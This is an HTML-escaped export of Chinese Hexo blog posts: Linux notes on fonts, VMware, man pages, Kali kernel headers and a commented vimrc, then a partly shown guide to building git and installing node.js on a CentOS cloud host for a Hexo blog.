-fv     //识别字体库</span><br><span class="line"></span><br><span class="line">fc-list :lang=zh-cn | sort    //确认是否安装</span><br></pre></td></tr></table></figure><h3 id="关于vmware-虚拟机安装"><a href="#关于vmware-虚拟机安装" class="headerlink" title="关于vmware 虚拟机安装"></a>关于vmware 虚拟机安装</h3><ol><li>官网下载虚拟机最新版本</li><li>chmod -x 下载的文件</li><li>sudo bash 下载的文件</li><li>之后就可以在电脑中找到虚拟机，并进行下一步的安装操作</li></ol><h3 id="linux-vmware升级问题"><a href="#linux-vmware升级问题" class="headerlink" title="linux-vmware升级问题"></a>linux-vmware升级问题</h3><p><a href="https://www.cnblogs.com/wjshan0808/p/4110495.html">解决 linux升级 导致VMware启动出现”before you can run vmware workstation, serveral modules must be complied and loaded into the runing kernel” 而无法卸载</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># vmware-uninstall </span><br><span class="line">You have gotten this message because you are either downgrading VMware</span><br><span class="line">Workstation, Player, or VIX, or because you attempted to run either</span><br><span class="line">vmware-uninstall or vmware-uninstall-vix.</span><br><span class="line"></span><br><span class="line">If you are downgrading, please uninstall all newer versions first, then</span><br><span class="line">install again.</span><br><span class="line"></span><br><span class="line">The vmware-uninstall* scripts have been deprecated.  Instead, please use</span><br><span class="line">the vmware-installer.</span><br><span class="line"></span><br><span class="line">Long form:</span><br><span class="line">      vmware-installer --uninstall-product PRODUCT</span><br><span class="line">Short form:</span><br><span class="line">      vmware-installer -u PRODUCT</span><br><span class="line"></span><br><span class="line">Where PRODUCT is one of vmware-workstation, vmware-player, or vmware-vix.</span><br><span class="line"></span><br><span class="line">For a list of which products are installed, you may run:</span><br><span class="line">      vmware-installer --list-products</span><br><span class="line">or:</span><br><span class="line">      vmware-installer -l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># vmware-installer -l</span><br><span class="line">Product Name         Product Version     </span><br><span class="line">==================== ====================</span><br><span class="line">vmware-workstation   10.0.4.2249910      </span><br><span class="line"># vmware-installer -u vmware-workstation</span><br></pre></td></tr></table></figure><h3 id="man-中文手册下载"><a href="#man-中文手册下载" class="headerlink" title="man 中文手册下载"></a>man 中文手册下载</h3><ol><li>Debian / Ubuntu安装</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install manpages-zh</span><br></pre></td></tr></table></figure><ol start="2"><li>Arch Linux:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -Syu</span><br><span class="line">pacman -S man-pages-zh_cn man-pages-zh_tw</span><br></pre></td></tr></table></figure><ol start="3"><li>Red Hat / CentOS:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum install man-pages-zh-CN</span><br></pre></td></tr></table></figure><ol start="4"><li>Fedora:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnf update</span><br><span class="line">dnf install man-pages-zh-CN</span><br></pre></td></tr></table></figure><h3 id="kali内核更新安装"><a href="#kali内核更新安装" class="headerlink" title="kali内核更新安装"></a>kali内核更新安装</h3><ol><li>查看内核版本</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure><ol start="2"><li>检查linux是否安装对应的头文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-cache search linux-headers</span><br></pre></td></tr></table></figure><ol start="3"><li>安装更新头文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install linux-headers-$(uname -r)</span><br></pre></td></tr></table></figure><ol start="4"><li>内核头文件检测是否安装</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg-query -s linux-headers-`uname -r`</span><br></pre></td></tr></table></figure><h3 id="vim命令"><a href="#vim命令" class="headerlink" title="vim命令"></a>vim命令</h3><ol><li>:set number 显示行号</li><li>:set 取消行号</li><li>xG:跳转到指定的第x行，G移动到文件末尾行</li><li>dd ：剪切一行， yy：复制一行</li><li>D：剪切一个字符，y：复制一个字符</li><li>p：粘贴</li><li>dxw：删除光标右边x个字符</li><li>dxh：删除光标左边x个字符</li><li>:x 删除一个字符</li><li>/string :查找字符 n:向上查找，N：向下查找</li><li>:范围 s/oldword/newword/g  字符替换 %s全文查找，g为global，全局替换</li></ol><ul><li>vim规则总结</li></ul><p>（1）一般是操作字符+被操作的量</p><p>（2）$ 为结尾， 0 为开头</p><ul><li><p>vim简单配置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;===================</span></span><br><span class="line"><span class="string">&quot;</span>适合自己用的vimrc配置文件</span><br><span class="line"><span class="string">&quot;===================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>设置编码</span><br><span class="line"><span class="built_in">set</span> fileencodings=utf<span class="number">-8</span>,ucs-bom,gb18030,gbk,gb2312,cp936</span><br><span class="line"><span class="built_in">set</span> termencoding=utf<span class="number">-8</span></span><br><span class="line"><span class="built_in">set</span> encoding=utf<span class="number">-8</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;保存.vimrc文件时自动重启加载，即让此文件立即生效</span></span><br><span class="line"><span class="string">autocmd BufWritePost $MYVIMRC source $MYVIMRC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>语法高亮</span><br><span class="line">syntax on</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;设置ruler会在右下角显示光标所在的行号和列号,不方便查看,改成设置状态栏显示内容</span></span><br><span class="line"><span class="string">&quot;</span><span class="built_in">set</span> ruler</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;设置状态行显示的内容. %F: 显示当前文件的完整路径. %r: 如果readonly,会显示[RO]</span></span><br><span class="line"><span class="string">&quot;</span>%B: 显示光标下字符的编码值,十六进制. %l:光标所在的行号. %v:光标所在的虚拟列号.</span><br><span class="line"><span class="string">&quot;%P: 显示当前内容在整个文件中的百分比. %H和%M是strftime()函数的参数,获取时间.</span></span><br><span class="line"><span class="string">set statusline=%F%r\ [HEX=%B][%l,%v,%P]\ %&#123;strftime(\&quot;%H:%M\&quot;)&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>显示行号</span><br><span class="line"><span class="built_in">set</span> nu <span class="string">&quot;等同于 set number</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>突出显示当前行</span><br><span class="line"><span class="built_in">set</span> cursorline <span class="string">&quot;等同于 set cul</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>突出显示当前列</span><br><span class="line"><span class="built_in">set</span> cursorcolumn <span class="string">&quot;等同于 set cuc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>共享剪贴板  </span><br><span class="line"><span class="built_in">set</span> clipboard+=unnamed </span><br><span class="line"></span><br><span class="line"><span class="string">&quot;从不备份  </span></span><br><span class="line"><span class="string">set nobackup</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>自动保存</span><br><span class="line"><span class="built_in">set</span> autowrite</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;隐藏工具栏</span></span><br><span class="line"><span class="string">&quot;</span><span class="built_in">set</span> guioptions-=T</span><br><span class="line"><span class="string">&quot;隐藏菜单栏</span></span><br><span class="line"><span class="string">&quot;</span><span class="built_in">set</span> guioptions-=m</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;高亮显示所有搜索到的内容.后面用map映射快捷键来方便关闭当前搜索的高亮.</span></span><br><span class="line"><span class="string">&quot;</span><span class="built_in">set</span> hlsearch</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;光标立刻跳转到搜索到内容</span></span><br><span class="line"><span class="string">&quot;</span><span class="built_in">set</span> incsearch</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;搜索到最后匹配的位置后,再次搜索不回到第一个匹配处</span></span><br><span class="line"><span class="string">&quot;</span><span class="built_in">set</span> nowrapscan</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;去掉输入错误时的提示声音</span></span><br><span class="line"><span class="string">set noeb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> 默认按下Esc后,需要等待<span class="number">1</span>秒才生效,设置Esc超时时间为<span class="number">100</span>ms,尽快生效</span><br><span class="line"><span class="built_in">set</span> ttimeout</span><br><span class="line"><span class="built_in">set</span> ttimeoutlen=<span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;在处理未保存或只读文件的时候，弹出确认</span></span><br><span class="line"><span class="string">set confirm</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>让Backspace键可以往前删除字符.</span><br><span class="line"><span class="string">&quot;Debian系统自带的vim版本会加载一个debian.vim文件,默认已经设置这一项,</span></span><br><span class="line"><span class="string">&quot;</span>可以正常使用Backspace键.如果使用自己编译的vim版本,并自行配置.vimrc文件,</span><br><span class="line"><span class="string">&quot;可能就没有设置这一项,导致Backspace键用不了,或者时灵时不灵.所以主动配置.</span></span><br><span class="line"><span class="string">&quot;</span>使回格键（backspace）正常处理indent, eol, start等</span><br><span class="line"><span class="built_in">set</span> backspace=indent,eol,start</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;允许backspace和光标键跨越行边界</span></span><br><span class="line"><span class="string">&quot;</span><span class="built_in">set</span> whichwrap+=&lt;,&gt;,h,l</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;去掉有关vi一致性模式,避免操作习惯上的局限.</span></span><br><span class="line"><span class="string">set nocompatible</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>FIXME 在MS-DOS控制台打开vim时,控制台使用鼠标右键来复制粘贴,设置</span><br><span class="line"><span class="string">&quot;全鼠标模式,鼠标右键被映射为visual mode,不能用来复制粘贴,不方便.</span></span><br><span class="line"><span class="string">&quot;</span>但是如果不设置鼠标模式,会无法使用鼠标滚轮来滚动界面.经过验证,发现</span><br><span class="line"><span class="string">&quot;可以设成普通模式mouse=n来使用鼠标滚轮,也能使用鼠标右键复制粘贴.</span></span><br><span class="line"><span class="string">&quot;</span> mouse=c/mouse=i模式都不能用鼠标滚轮. Linux下还是要设成 mouse=a</span><br><span class="line"><span class="built_in">set</span> mouse=n</span><br><span class="line"><span class="string">&quot;set selection=exclusive</span></span><br><span class="line"><span class="string">&quot;</span><span class="built_in">set</span> selectmode=mouse,key</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;高亮显示括号匹配</span></span><br><span class="line"><span class="string">set showmatch</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>设置Tab长度为<span class="number">4</span>空格</span><br><span class="line"><span class="built_in">set</span> tabstop=<span class="number">4</span></span><br><span class="line"><span class="string">&quot;设置自动缩进长度为4空格</span></span><br><span class="line"><span class="string">set shiftwidth=4</span></span><br><span class="line"><span class="string">&quot;</span>自动缩进,这个导致从外面拷贝多行以空格开头的内容时,会有多的缩进,先不设置</span><br><span class="line"><span class="string">&quot;set autoindent</span></span><br><span class="line"><span class="string">&quot;</span>不要用空格代替制表符</span><br><span class="line"><span class="built_in">set</span> noexpandtab</span><br><span class="line"><span class="string">&quot;输入tab制表符时，自动替换成空格</span></span><br><span class="line"><span class="string">&quot;</span><span class="built_in">set</span> expandtab</span><br><span class="line"><span class="string">&quot;设置softtabstop有一个好处是可以用Backspace键来一次删除4个空格.</span></span><br><span class="line"><span class="string">&quot;</span>softtabstop的值为负数,会使用shiftwidth的值,两者保持一致,方便统一缩进.</span><br><span class="line"><span class="string">&quot;set softtabstop=4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>显示空格和tab键</span><br><span class="line"><span class="built_in">set</span> listchars=tab:&gt;-,trail:-</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;1=启动显示状态行, 2=总是显示状态行.设置总是显示状态行,方便看到当前文件名</span></span><br><span class="line"><span class="string">set laststatus=2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>自动补全</span><br><span class="line">:inoremap ( ()&lt;ESC&gt;i</span><br><span class="line">:inoremap ) &lt;c-r&gt;=ClosePair(<span class="string">&#x27;)&#x27;</span>)&lt;CR&gt;</span><br><span class="line">:inoremap &#123; &#123;&lt;CR&gt;&#125;&lt;ESC&gt;O</span><br><span class="line">:inoremap &#125; &lt;c-r&gt;=ClosePair(<span class="string">&#x27;&#125;&#x27;</span>)&lt;CR&gt;</span><br><span class="line">:inoremap [ []&lt;ESC&gt;i</span><br><span class="line">:inoremap ] &lt;c-r&gt;=ClosePair(<span class="string">&#x27;]&#x27;</span>)&lt;CR&gt;</span><br><span class="line">:inoremap <span class="string">&quot; &quot;</span><span class="string">&quot;&lt;ESC&gt;i</span></span><br><span class="line"><span class="string">:inoremap &#x27; &#x27;&#x27;&lt;ESC&gt;i</span></span><br><span class="line"><span class="string">function! ClosePair(char)</span></span><br><span class="line"><span class="string">    if getline(&#x27;.&#x27;)[col(&#x27;.&#x27;) - 1] == a:char</span></span><br><span class="line"><span class="string">        return &quot;</span>\&lt;Right&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">        return a:char</span></span><br><span class="line"><span class="string">    endif</span></span><br><span class="line"><span class="string">endfunction </span></span><br><span class="line"><span class="string">&quot;</span>打开文件类型检测,并载入文件类型插件,为特定文件类型载入相关缩进文</span><br><span class="line">filetype plugin indent on</span><br><span class="line"><span class="string">&quot; 设置自动补全的选项. longest表示只自动补全最大匹配的部分,剩余部分通过</span></span><br><span class="line"><span class="string">&quot;</span> CTRL-P/CTRL-N来选择匹配项进行补全. menu表示弹出可补全的内容列表.</span><br><span class="line"><span class="string">&quot; 如果有多个匹配,longest选项不会自动选中并完整补全,要多按一次CTRL-P,比较</span></span><br><span class="line"><span class="string">&quot;</span> 麻烦,不做设置,保持默认设置,vim默认没有设置longest.</span><br><span class="line"><span class="string">&quot;set completeopt=longest,menu &quot;</span>启用这句才会开启自动补全</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;=============显示中文帮助</span></span><br><span class="line"><span class="string">if version &gt;= 603</span></span><br><span class="line"><span class="string">    set helplang=cn</span></span><br><span class="line"><span class="string">    set encoding=utf-8</span></span><br><span class="line"><span class="string">endif</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>=============新建.c,.h,.sh,.java文件，自动插入文件头 </span><br><span class="line">autocmd BufNewFile *.cpp,*.[ch],*.sh,*.java exec <span class="string">&quot;:call SetTitle()&quot;</span> </span><br><span class="line"><span class="string">&quot;&quot;</span>定义函数SetTitle，自动插入文件头 </span><br><span class="line">func SetTitle() </span><br><span class="line">    <span class="string">&quot;如果文件类型为.sh文件 </span></span><br><span class="line"><span class="string">    if &amp;filetype == &#x27;sh&#x27; </span></span><br><span class="line"><span class="string">        call setline(1,&quot;</span>\############################<span class="string">&quot;) </span></span><br><span class="line"><span class="string">        call append(line(&quot;</span>.<span class="string">&quot;), &quot;</span>\# File Name: <span class="string">&quot;.expand(&quot;</span>%<span class="string">&quot;)) </span></span><br><span class="line"><span class="string">        call append(line(&quot;</span>.<span class="string">&quot;)+1, &quot;</span>\# Author: Li Ziqiang<span class="string">&quot;) </span></span><br><span class="line"><span class="string">        call append(line(&quot;</span>.<span class="string">&quot;)+2, &quot;</span>\<span class="meta"># mail: 2296557984@qq.com<span class="meta-string">&quot;) </span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        call append(line(&quot;</span>.<span class="meta-string">&quot;)+3, &quot;</span>\# Created Time: <span class="meta-string">&quot;.strftime(&quot;</span>%c<span class="meta-string">&quot;))</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        call append(line(&quot;</span>.<span class="meta-string">&quot;)+4, &quot;</span>\############################<span class="meta-string">&quot;) </span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        call append(line(&quot;</span>.<span class="meta-string">&quot;)+5, &quot;</span>\#!/bin/bash<span class="meta-string">&quot;) </span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        call append(line(&quot;</span>.<span class="meta-string">&quot;)+6, &quot;</span><span class="meta-string">&quot;) </span></span></span><br><span class="line"><span class="meta-string"><span class="meta">    else </span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        call setline(1, &quot;</span><span class="comment">/******************************&quot;) </span></span></span><br><span class="line"><span class="comment"><span class="meta">        call append(line(&quot;.&quot;), &quot;    &gt; File Name: &quot;.expand(&quot;%&quot;)) </span></span></span><br><span class="line"><span class="comment"><span class="meta">        call append(line(&quot;.&quot;)+1, &quot;    &gt; Author:Li Ziqiang&quot;) </span></span></span><br><span class="line"><span class="comment"><span class="meta">        call append(line(&quot;.&quot;)+2, &quot;    &gt; Mail: 2296557984@qq.com &quot;) </span></span></span><br><span class="line"><span class="comment"><span class="meta">        call append(line(&quot;.&quot;)+3, &quot;    &gt; Created Time: &quot;.strftime(&quot;%c&quot;)) </span></span></span><br><span class="line"><span class="comment"><span class="meta">        call append(line(&quot;.&quot;)+4, &quot; *****************************/</span><span class="meta-string">&quot;) </span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        call append(line(&quot;</span>.<span class="meta-string">&quot;)+5, &quot;</span><span class="meta-string">&quot;)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">    endif</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta">    &quot;</span>新建文件后，自动定位到文件末尾</span></span><br><span class="line">    autocmd BufNewFile * normal G</span><br><span class="line">endfunc </span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo＋腾讯云主机搭建博客</title>
      <link href="/2020/09/14/hexo+%E8%85%BE%E8%AE%AF%E4%BA%91%E4%B8%BB%E6%9C%BA%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2020/09/14/hexo+%E8%85%BE%E8%AE%AF%E4%BA%91%E4%B8%BB%E6%9C%BA%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="hexo＋腾讯云主机搭建博客"><a href="#hexo＋腾讯云主机搭建博客" class="headerlink" title="hexo＋腾讯云主机搭建博客"></a>hexo＋腾讯云主机搭建博客</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/120322118">参考链接1</a></li><li><a href="https://www.jianshu.com/p/31eb5c754c01">参考链接2</a></li><li><a href="https://zhuanlan.zhihu.com/p/60578464">参考链接3</a></li></ul><ul><li>说明：不建议用hexo在云主机上搭建博客，感觉多此一举，建议hexo+github， wordpress+云主机（宝塔界面更快哦）</li></ul><span id="more"></span><h3 id="一．Git安装"><a href="#一．Git安装" class="headerlink" title="一．Git安装"></a>一．Git安装</h3><ul><li>我使用的云主机是centos8系统的，之前也用过ubuntu18系统，但是感觉效果不怎的，可能试的次数比较少吧</li><li>先检查是否有git</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure><ul><li>没有则安装，旧的卸载重装</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">＃卸载旧的git</span><br><span class="line">yum remove git</span><br><span class="line"># 安装依赖库</span><br><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel</span><br><span class="line"># 将git下载安装到/usr/local/src目录</span><br><span class="line">cd /usr/local/src</span><br><span class="line">wget http://ftp.ntu.edu.tw/software/scm/git/git-2.26.0.tar.gz</span><br><span class="line">tar -zvxf git-2.26.0.tar.gz</span><br><span class="line"># 进入目录</span><br><span class="line">cd git-2.26.0</span><br><span class="line"># 编译执行</span><br><span class="line">make prefix=/usr/local/git all</span><br><span class="line"># 安装 git 到 /usr/local/git 目录下</span><br><span class="line">make prefix=/usr/local/git install</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二、配置Git环境变量"><a href="#二、配置Git环境变量" class="headerlink" title="二、配置Git环境变量"></a>二、配置Git环境变量</h3><ul><li>打开环境变量配置文件进行配置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line">#添加以下内容</span><br><span class="line">PATH=$PATH:/usr/local/git/bin   # git 的目录</span><br><span class="line">export PATH</span><br><span class="line"></span><br><span class="line"># 使配置的环境变量生效</span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure><ul><li>验证git安装成功</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure><h3 id="三、云主机与GitHub交换SSH密匙"><a href="#三、云主机与GitHub交换SSH密匙" class="headerlink" title="三、云主机与GitHub交换SSH密匙"></a>三、云主机与GitHub交换SSH密匙</h3><ul><li>Git初始化</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 设置github昵称</span><br><span class="line">git config --global user.name &#x27;mxrmiss&#x27;</span><br><span class="line"># 设置github邮箱</span><br><span class="line">git config --global user.email &#x27;heroli520@outlook.com&#x27;</span><br></pre></td></tr></table></figure><ul><li>git status 无法显示中文</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global core.quotepath false</span><br></pre></td></tr></table></figure><ul><li>创建ssh密匙</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;GitHub 邮箱&quot;</span><br></pre></td></tr></table></figure><ul><li>输出 id_rsa.pub 内容并复制到GitHub中的setting页面上</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat id_rsa.pub</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/syONLT"><img "" class="lazyload placeholder" data-original="https://s3.ax1x.com/2021/01/18/syONLT.jpg" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="syONLT.jpg"></a></p><ul><li>ssh -T <a href="mailto:git@github.com">git@github.com</a> 输入此命令，显示successful表示成功</li></ul><h3 id="四、node-js安装"><a href="#四、node-js安装" class="headerlink" title="四、node.js安装"></a>四、node.js安装</h3><ol><li>node.js下载</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">wget https://npm.taobao.org/mirrors/node/latest-v15.x/node-v15.0.1-linux-x64.tar.xz  # 下载二进制安装包</span><br></pre></td></tr></table></figure><ol start="2"><li>node.js部署</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">tar xf node-v10.16.0-linux-x64.tar.xz </span><br><span class="line">ln -s node-v10.16.0-linux-x64 nodejs</span><br><span class="line">nodejs -&gt; node-v10.16.0-linux-x64</span><br></pre></td></tr></table></figure><ol start="3"><li>版本信息</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/nodejs/bin</span><br><span class="line">./node -v</span><br><span class="line">会看到 v10.16.0</span><br></pre></td></tr></table></figure><ol start="4"><li>创建软连接</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 